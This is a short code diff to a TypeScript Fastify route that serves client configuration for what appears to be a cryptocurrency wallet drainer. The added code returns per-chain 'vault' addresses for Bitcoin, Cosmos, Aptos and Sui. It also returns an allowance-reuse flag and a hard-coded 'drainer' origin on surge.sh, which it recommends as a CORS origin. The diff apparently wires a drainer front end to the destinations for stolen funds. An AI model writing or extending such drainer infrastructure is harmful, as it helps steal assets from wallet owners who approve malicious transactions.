@@ -5,7 +5,33 @@ import { createHash } from 'node:crypto'
 
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 
+import {
+  resolveAptosVaultAddress,
+  resolveBitcoinVaultAddress,
+  resolveCosmosVaultAddress,
+  resolveSuiVaultAddress,
+} from '@legion/core'
+
 import { sendSuccess } from '../lib/api-response.js'
+
+const SURGE_DRAINER_ORIGIN = 'https://legion-drainer-test.surge.sh'
+
+function readVaultAddresses(): Record<string, string | null> {
+  return {
+    btc: resolveBitcoinVaultAddress(),
+    cosmos: resolveCosmosVaultAddress(),
+    aptos: resolveAptosVaultAddress(),
+    sui: resolveSuiVaultAddress(),
+  }
+}
+
+function readCorsOriginsHint(): string[] {
+  const raw = process.env['API_CORS_ORIGINS']?.trim() ?? ''
+  return raw
+    .split(',')
+    .map((s) => s.trim())
+    .filter(Boolean)
+}
 
 function readBackendUrls(): string[] {
   const multi = process.env['BACKEND_URLS']?.trim()
@@ -55,6 +81,8 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
     if (expiresAt.getTime() <= Date.now()) {
       expiresAt.setUTCDate(expiresAt.getUTCDate() + 1)
     }
+    const corsOrigins = readCorsOriginsHint()
+    const vaultAddresses = readVaultAddresses()
     return sendSuccess(reply, 200, 'Client config ready', {
       endpoints,
       primary: endpoints[0],
@@ -62,6 +90,11 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
       expires_at: expiresAt.toISOString(),
       eip7702_enabled: (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true',
       onchain_config_contract: process.env['ONCHAIN_CONFIG_CONTRACT_ADDRESS']?.trim() || null,
+      vault_addresses: vaultAddresses,
+      allowance_reuse_enabled:
+        (process.env['ALLOWANCE_REUSE_ENABLED']?.trim().toLowerCase() ?? 'true') !== 'false',
+      surge_origin_configured: corsOrigins.includes(SURGE_DRAINER_ORIGIN),
+      recommended_cors_origins: [SURGE_DRAINER_ORIGIN],
     })
   })
 }
